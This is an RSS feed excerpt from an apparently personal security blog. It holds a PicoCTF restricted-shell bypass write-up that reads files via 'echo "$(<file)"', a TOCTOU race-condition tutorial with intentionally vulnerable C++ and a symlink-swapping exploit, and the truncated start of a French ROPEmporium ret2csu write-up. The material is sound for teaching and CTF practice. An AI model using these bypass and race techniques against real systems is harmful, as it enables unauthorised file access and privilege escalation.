            <title>🇬🇧 PicoCTF 2023 - misc/specialer</title>
            <link>/posts/2023/03/picoctf-2023-misc/specialer/</link>
            <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/03/picoctf-2023-misc/specialer/</guid>
            <description>&lt;h2 id=&#34;note&#34;&gt;Note&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Specialer&lt;/em&gt; was &lt;em&gt;an even funnier&lt;/em&gt; challenge from the &lt;em&gt;general skills&lt;/em&gt; category (which is PicoCTF&amp;rsquo;s &lt;em&gt;misc&lt;/em&gt; category).&lt;/p&gt;
&lt;p&gt;It was based on the same principle as the &lt;em&gt;Special&lt;/em&gt; challenge, bypassing a bash shell filter to read the flag.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s dive into it !&lt;/p&gt;
&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Reception of Special has been cool to say the least. 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;That&amp;#39;s why we made an exclusive version of Special, called Secure Comprehensive Interface for Affecting Linux Empirically Rad, or just &amp;#39;Specialer&amp;#39;. 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;With Specialer, we really tried to remove the distractions from using a shell. 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Yes, we took out spell checker because of everybody&amp;#39;s complaining. 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;But we think you will be excited about our new, reduced feature set for keeping you focused on what needs it the most. 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Please start an instance to test your very own copy of Specialer.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ssh -p 53888 ctf-player@saturn.picoctf.net. The password is *****
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;poking-around&#34;&gt;Poking around&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/228334746-be91a5d6-6f85-4359-b602-bab18110617e.png&#34; alt=&#34;2023-03-28-202047_139x26_scrot&#34;&gt;&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="note">Note</h2>
<p><em>Specialer</em> was <em>an even funnier</em> challenge from the <em>general skills</em> category (which is PicoCTF&rsquo;s <em>misc</em> category).</p>
<p>It was based on the same principle as the <em>Special</em> challenge, bypassing a bash shell filter to read the flag.</p>
<p>Let&rsquo;s dive into it !</p>
<h2 id="description">Description</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Reception of Special has been cool to say the least. 
</span></span><span style="display:flex;"><span>That&#39;s why we made an exclusive version of Special, called Secure Comprehensive Interface for Affecting Linux Empirically Rad, or just &#39;Specialer&#39;. 
</span></span><span style="display:flex;"><span>With Specialer, we really tried to remove the distractions from using a shell. 
</span></span><span style="display:flex;"><span>Yes, we took out spell checker because of everybody&#39;s complaining. 
</span></span><span style="display:flex;"><span>But we think you will be excited about our new, reduced feature set for keeping you focused on what needs it the most. 
</span></span><span style="display:flex;"><span>Please start an instance to test your very own copy of Specialer.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ssh -p 53888 ctf-player@saturn.picoctf.net. The password is *****
</span></span></code></pre></div><h2 id="poking-around">Poking around</h2>
<p><img src="https://user-images.githubusercontent.com/77807503/228334746-be91a5d6-6f85-4359-b602-bab18110617e.png" alt="2023-03-28-202047_139x26_scrot"></p>
<p>Same as for the previous challenge, this indicates that we are not on a <em>typical</em> shell.</p>
<p>Let&rsquo;s start poking around to see what we <em>can</em> and <em>can&rsquo;t</em> do. We&rsquo;ll start by trying <code>whoami</code>, <code>pwd</code> and <code>ls</code>:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228334765-40458e85-d3be-4ffb-a34f-1f2f89264b0a.png" alt="2023-03-28-202313_340x142_scrot"></p>
<p>As you can see, only <code>pwd</code> works. This command is not useful but it shows that there is no filter, some commands are just not available.</p>
<p>To list all the available commands, we can use the <code>compgen -c</code> command.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&lt;...&gt;
</span></span><span style="display:flex;"><span>alias
</span></span><span style="display:flex;"><span>bg
</span></span><span style="display:flex;"><span>bind
</span></span><span style="display:flex;"><span>break
</span></span><span style="display:flex;"><span>builtin
</span></span><span style="display:flex;"><span>caller
</span></span><span style="display:flex;"><span>cd
</span></span><span style="display:flex;"><span>command
</span></span><span style="display:flex;"><span>compgen
</span></span><span style="display:flex;"><span>complete
</span></span><span style="display:flex;"><span>compopt
</span></span><span style="display:flex;"><span>continue
</span></span><span style="display:flex;"><span>declare
</span></span><span style="display:flex;"><span>dirs
</span></span><span style="display:flex;"><span>disown
</span></span><span style="display:flex;"><span>echo
</span></span><span style="display:flex;"><span>enable
</span></span><span style="display:flex;"><span>eval
</span></span><span style="display:flex;"><span>exec
</span></span><span style="display:flex;"><span>exit
</span></span><span style="display:flex;"><span>export
</span></span><span style="display:flex;"><span>&lt;...&gt;
</span></span></code></pre></div><h2 id="bypassing-the-filter">Bypassing the filter</h2>
<p>Among all of these, we can see one very interesting command: <code>echo</code>.</p>
<p>Indeed, we can use <code>echo</code> to act as a <code>ls</code> by doing <code>echo *</code>:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228334799-5dc7e5fd-fabc-4505-9adc-f44b5923e956.png" alt="2023-03-28-202552_177x43_scrot"></p>
<blockquote>
<p>Fun fact: Since we have access to the <code>alias</code> command, we can make an alias for <code>ls</code> to artificially make it work again:</p></blockquote>
<p><img src="https://user-images.githubusercontent.com/77807503/228334826-65a55a9d-d883-4e93-9e8a-1d234e2236c4.png" alt="2023-03-28-202627_284x68_scrot"></p>
<p>We see three folders: <code>abra</code>, <code>ala</code> and <code>sim</code>.</p>
<p>Since we have access to the <code>cd</code> command, we can use it to go into them and list their content.</p>
<p>Let&rsquo;s try to list the content of the <code>ala</code> folder:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228334862-c8db64e5-09c2-4097-9720-403cebabb0db.png" alt="2023-03-28-202910_197x67_scrot"></p>
<p>There are two text files and we don&rsquo;t have access to <code>cat</code>, <code>head</code> or <code>tail</code>&hellip; but that&rsquo;s ok, because we have access to <code>echo</code> !</p>
<p>Here is the trick to read a file with the <code>echo</code> command: <code>echo &quot;$(&lt;kazam.txt)&quot;</code></p>
<p><img src="https://user-images.githubusercontent.com/77807503/228334887-fc7cc2c0-33a3-4c4e-a039-319e498c9f5c.png" alt="2023-03-28-203032_681x44_scrot"></p>
<p>As you can see, it worked ! GGs</p>
<blockquote>
<p>There are other text files in the other directories, but they&rsquo;re just rabbit holes</p></blockquote>
]]></content>
        </item>
        
        <item>
            <title>🇬🇧 What is: &#34;A Race Condition Attack&#34;</title>
            <link>/posts/2023/03/what-is-a-race-condition-attack/</link>
            <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/03/what-is-a-race-condition-attack/</guid>
            <description>&lt;h3 id=&#34;table-of-contents&#34;&gt;Table of contents&lt;/h3&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2023/03/what-is-a-race-condition-attack/#introduction&#34;&gt;Introduction&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2023/03/what-is-a-race-condition-attack/#time-of-check-time-of-use&#34;&gt;Time of check, Time of use&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2023/03/what-is-a-race-condition-attack/#example&#34;&gt;Example&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2023/03/what-is-a-race-condition-attack/#how-to-avoid-these-attacks&#34;&gt;How to avoid these attacks&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2023/03/what-is-a-race-condition-attack/#conclusion&#34;&gt;Conclusion&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;/posts/2023/03/what-is-a-race-condition-attack/#further-documentation&#34;&gt;Further documentation&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1 id=&#34;prerequisites&#34;&gt;Prerequisites&lt;/h1&gt;
&lt;p&gt;&lt;em&gt;none&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;With our current technology, computers are often faster than humans at doing things in general. Today, we&amp;rsquo;re going to show that with the right timing, this speed becomes pretty useless&amp;hellip;&lt;/p&gt;
&lt;p&gt;Of course, we are not actually going to be faster than the computer, but let&amp;rsquo;s dive into &lt;strong&gt;Race Condition attacks&lt;/strong&gt; to better understand what they are and how they work !&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h3 id="table-of-contents">Table of contents</h3>
<hr>
<ul>
<li>
<p><a href="/posts/2023/03/what-is-a-race-condition-attack/#introduction">Introduction</a></p>
</li>
<li>
<p><a href="/posts/2023/03/what-is-a-race-condition-attack/#time-of-check-time-of-use">Time of check, Time of use</a></p>
</li>
<li>
<p><a href="/posts/2023/03/what-is-a-race-condition-attack/#example">Example</a></p>
</li>
<li>
<p><a href="/posts/2023/03/what-is-a-race-condition-attack/#how-to-avoid-these-attacks">How to avoid these attacks</a></p>
</li>
<li>
<p><a href="/posts/2023/03/what-is-a-race-condition-attack/#conclusion">Conclusion</a></p>
</li>
<li>
<p><a href="/posts/2023/03/what-is-a-race-condition-attack/#further-documentation">Further documentation</a></p>
</li>
</ul>
<hr>
<h1 id="prerequisites">Prerequisites</h1>
<p><em>none</em></p>
<h1 id="introduction">Introduction</h1>
<p>With our current technology, computers are often faster than humans at doing things in general. Today, we&rsquo;re going to show that with the right timing, this speed becomes pretty useless&hellip;</p>
<p>Of course, we are not actually going to be faster than the computer, but let&rsquo;s dive into <strong>Race Condition attacks</strong> to better understand what they are and how they work !</p>
<p>First of all, we&rsquo;ll go through what is known as <em>Time of check</em> and <em>Time of use</em>, then, we&rsquo;ll illustrate this attack with an example taken from a CTF. In the last part, we&rsquo;ll briefly see how they can be spotted, and thus avoided.</p>
<h1 id="time-of-check-time-of-use">Time of check, Time of use</h1>
<p><strong>Time Of Check To Time Of Use</strong> (also known as <em>TOCTOU</em> or <em>TOCTTOU</em>) is a class of software bugs caused by a race condition.</p>
<p>This kind of bugs occur when a resource (such as a file) is checked then modified before it is used thus making the check useless or invalid. They usually happen when the status changes, either maliciously or unintentionally and they often lead to <em>Privilege Escalation</em>, allowing the user to read or modify files they shouldn&rsquo;t be able to.</p>
<p>They are also very difficult to detect, but we&rsquo;ll go over that in the last part.</p>
<h1 id="example">Example</h1>
<p>To illustrate my topic, we are going to take a challenge from <em>PicoCTF 2023</em> called &ldquo;tic-tac&rdquo;.</p>
<p>We are given this <code>.cpp</code> file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fstream&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[]) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cerr <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Usage: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> argv[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34; &lt;filename&gt;&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  std<span style="color:#f92672">::</span>string filename <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>  std<span style="color:#f92672">::</span>ifstream file(filename);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">stat</span> statbuf;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Check the file&#39;s status information.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (stat(filename.c_str(), <span style="color:#f92672">&amp;</span>statbuf) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cerr <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Error: Could not retrieve file information&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Check the file&#39;s owner.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (statbuf.st_uid <span style="color:#f92672">!=</span> getuid()) {
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cerr <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Error: you don&#39;t own this file&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Read the contents of the file.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (file.is_open()) {
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>string line;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (getline(file, line)) {
</span></span><span style="display:flex;"><span>      std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> line <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cerr <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Error: Could not open file&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><blockquote>
<p>If you want to try this code locally, you can copy it and compile it using <code>g++</code></p></blockquote>
<p>This program is going to read the file passed as the first argument. First, it checks the file&rsquo;s status information, then, <strong>it checks if the user is the file&rsquo;s owner</strong>. If both these checks pass, it reads the content of the specified file.</p>
<p>This is a very classic case of <em>Race Condition</em>. Our goal is to read <code>flag.txt</code>.</p>
<p>Here&rsquo;s what we are going to do:</p>
<ul>
<li>First, create a <code>fake_flag.txt</code> file.</li>
<li>Then, make a <em>symbolic link</em> to this file.</li>
<li>Finally, make a <code>while</code> loop that keeps switching the <em>symbolic link</em> between the <code>fake_flag.txt</code> and the <code>flag.txt</code> files.</li>
</ul>
<p>With a little luck, the loop will change the <em>symlink</em> right after the check is passed, and thus the program will read <code>flag.txt</code>.</p>
<p>Alright, first, let&rsquo;s create the <code>fake_flag.txt</code> file and make our <em>symlink</em>.</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228324512-0a660668-a0b6-480c-9e85-588565d283fc.png" alt="2023-03-17-182749_1914x325_scrot"></p>
<p>By doing <code>ls -la</code>, we can see that our <code>exploit</code> is pointing to the <code>fake_flag.txt</code> file.</p>
<p>Then, let&rsquo;s make our loop and put it in the background:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228324640-ff779217-0745-4528-b91a-9caa51823e19.png" alt="2023-03-17-182949_1911x969_scrot"></p>
<p>We can check it is working by running <code>ls -la</code> again and seeing if the <em>symlink</em> changes.</p>
<p>Now, we could try to launch the process manually but that would be very annoying, so we can also make a loop for that:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228324689-c0346748-4a03-46db-a6fc-02c39fad40f8.png" alt="2023-03-17-183348_843x308_scrot"></p>
<p>This is not mandatory, but it just saves you time because you can&rsquo;t guess the timing for the check.</p>
<p>Let&rsquo;s run this, and see if it works:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228324726-7e25cdd0-a5ef-4916-a7a6-5914c8bd78ca.png" alt="2023-03-17-183510_993x982_scrot"></p>
<p>As you can see, it failed a lot of times but it worked once and that&rsquo;s all we need !</p>
<p>Here&rsquo;s a scheme that recaps what happenned (if you can&rsquo;t see it, right click &amp; open image):</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228324757-daa63488-0b9b-4356-a71f-65a34e21de63.png" alt="Untitled Diagram drawio(1)"></p>
<h1 id="how-to-avoid-these-attacks">How to avoid these attacks</h1>
<p>As I said it in the first part, this kind of attack is hard to detect and to mitigate. The root cause of many TOCTTOU vulnerabilities lies in the lack of concurrency control in an operating system&rsquo;s file-system API and so it&rsquo;s not a problem that&rsquo;s easy to resolve. The challenge therefore is ensuring the file system state, managed by the operating system, cannot change between two system calls.</p>
<p>There is no global patch for these attacks, the first challenge is obviously to identify them, but patching them is rather hard. A technique could be <em>locking the file</em> before it is checked to ensure it&rsquo;s not getting modified during the process.</p>
<p>Another technique could be to use error handling: we could use a <em>try/catch</em> that would <em>try</em> to read the specified file, and <em>catch</em> the error if the user can&rsquo;t read it.</p>
<h1 id="conclusion">Conclusion</h1>
<p><em>Race Condition</em> attacks are theorically simple and easy to understand, but they can be very dangerous because of their difficulty in being identified and the risks to which they expose the system. Hopefully, there are some ways to avoid them, so make sure to secure your program.</p>
<p>Thank you for reading this post, if you have any questions feel free to contact me on <a href="https://discord.com/users/254689803822563348">discord</a>.</p>
<h1 id="further-documentation">Further documentation</h1>
<p>-&gt; <a href="https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use">https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use</a></p>
<p>-&gt; <a href="https://www.techtarget.com/searchsecurity/answer/How-to-mitigate-the-risk-of-a-TOCTTOU-attack">https://www.techtarget.com/searchsecurity/answer/How-to-mitigate-the-risk-of-a-TOCTTOU-attack</a></p>
]]></content>
        </item>
        
        <item>
            <title>🇫🇷 ROPEmporium - ret2csu (x64)</title>
            <link>/posts/2023/03/ropemporium-ret2csu-x64/</link>
            <pubDate>Sun, 12 Mar 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/03/ropemporium-ret2csu-x64/</guid>
            <description>&lt;h2 id=&#34;note&#34;&gt;Note&lt;/h2&gt;
&lt;p&gt;Dernier exercice de ROPEmporium, j&amp;rsquo;ai effectivement sauté &lt;em&gt;fluff&lt;/em&gt; et &lt;em&gt;pivot&lt;/em&gt; puisque je voulais apprendre cette technique car je l&amp;rsquo;ai rencontrée lors d&amp;rsquo;un CTF. Je reviendrai peut-être sur &lt;em&gt;pivot&lt;/em&gt; mais je ne pense pas faire &lt;em&gt;fluff&lt;/em&gt; puisqu&amp;rsquo;il est bien trop &lt;strong&gt;chiant&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Je vais essayer d&amp;rsquo;expliquer au mieux ce que j&amp;rsquo;ai compris du &lt;strong&gt;ret2csu&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Comme d&amp;rsquo;habitude, si j&amp;rsquo;ai fait des erreurs, n&amp;rsquo;hésitez pas à me contacter sur &lt;a href=&#34;https://discord.com/users/254689803822563348&#34;&gt;discord&lt;/a&gt; pour me le dire.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="note">Note</h2>
<p>Dernier exercice de ROPEmporium, j&rsquo;ai effectivement sauté <em>fluff</em> et <em>pivot</em> puisque je voulais apprendre cette technique car je l&rsquo;ai rencontrée lors d&rsquo;un CTF. Je reviendrai peut-être sur <em>pivot</em> mais je ne pense pas faire <em>fluff</em> puisqu&rsquo;il est bien trop <strong>chiant</strong>.</p>
<p>Je vais essayer d&rsquo;expliquer au mieux ce que j&rsquo;ai compris du <strong>ret2csu</strong>.</p>
<p>Comme d&rsquo;habitude, si j&rsquo;ai fait des erreurs, n&rsquo;hésitez pas à me contacter sur <a href="https://discord.com/users/254689803822563348">discord</a> pour me le dire.</p>
<p>Si vous ne comprenez pas quelque chose, je vous invite à <a href="/series/ropemporium-x64-series/">regarder la série dans l&rsquo;ordre</a>.</p>
<p>Et cet exercice reprend le principe de <em>callme</em>, donc si vous n&rsquo;avez pas lu mon writeup sur ce dernier je vous conseille d&rsquo;y jeter un oeil.</p>
<h2 id="description">Description</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Same same, but different
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>This challenge is very similar to &#34;callme&#34;, with the exception of the useful gadgets. Simply call the `ret2win()` function in the accompanying library with same arguments that you used to beat the &#34;callme&#34; challenge (`ret2win(0xdeadbeef, 0xcafebabe, 0xd00df00d)` for the ARM &amp; MIPS binaries, `ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)` for the x86_64 binary.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Populating the elusive 3rd register using ROP can prove more difficult than you might expect, especially in smaller binaries with fewer gadgets. This can become particularly irksome since many useful GLIBC functions require three arguments.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>So little room for activities
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Start by using ropper to search for sensible gadgets, if there&#39;s no `pop rdx` for example, perhaps there&#39;s a `mov rdx, rbp` that you could chain with a `pop rbp`. If you&#39;re all out of ideas go ahead and read the last paragraph.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Universal
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Fortunately some very smart people have come up with a solution to your problem and as is customary in infosec given it a collection of pretentious names, including &#34;Universal ROP&#34;, &#34;μROP&#34;, &#34;return-to-csu&#34; or just &#34;ret2csu&#34;. You can learn all you need to on the subject from this [BlackHat Asia paper](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf). Note that more recent versions of gcc may use different registers from the example in `__libc_csu_init()`, including the version that compiled this challenge.
</span></span></code></pre></div><h2 id="file-information">File information</h2>
<p>Avant de commencer à regarder l&rsquo;executable, il faut savoir à quoi on s&rsquo;attaque, on va utiliser <code>file</code> pour avoir des informations sur le fichier, puis <code>checksec</code> pour voir les éventuelles sécuritées avec lesquelles il a été compilé</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">file</span> <span style="color:#f92672">ret2csu</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">ret2csu</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">/</span><span style="color:#f92672">lib64</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">f722121b08628ec9fc4a8cf5abd1071766097362</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>On va donc s&rsquo;attaquer à un executable en <strong>64bit</strong>, qui n&rsquo;est <strong>pas strippé</strong></p>
<p>Maintenant le <code>checksec</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">ret2csu</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ropemporium/ret2csu_x64/ret2csu&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RUNPATH</span><span style="color:#f92672">:</span>  <span style="color:#e6db74">&#39;.&#39;</span>
</span></span></code></pre></div><p>Comme pour les autres exercices <strong>NX</strong> est activé donc pas de shellcode, mais ce n&rsquo;est pas un problème puisque la description de l&rsquo;exercice nous indique exactement quoi faire.</p>
<h2 id="exploitation">Exploitation</h2>
<p>Pour rappel, le but de cet exercice est d&rsquo;appeller la fonction <code>ret2win()</code> avec en paramètres <code>0xdeadbeefdeadbeef</code>, <code>0xcafebabecafebabe</code> et <code>0xd00df00dd00df00d</code>.</p>
<p>Même si ça paraît simple, on va vite se rendre compte que certains gadgets manquent&hellip;</p>
<p>Commençons par essayer de trouver des quoi modifier les trois registres nécessaires: <code>rdi</code>, <code>rsi</code> et <code>rdx</code>:</p>
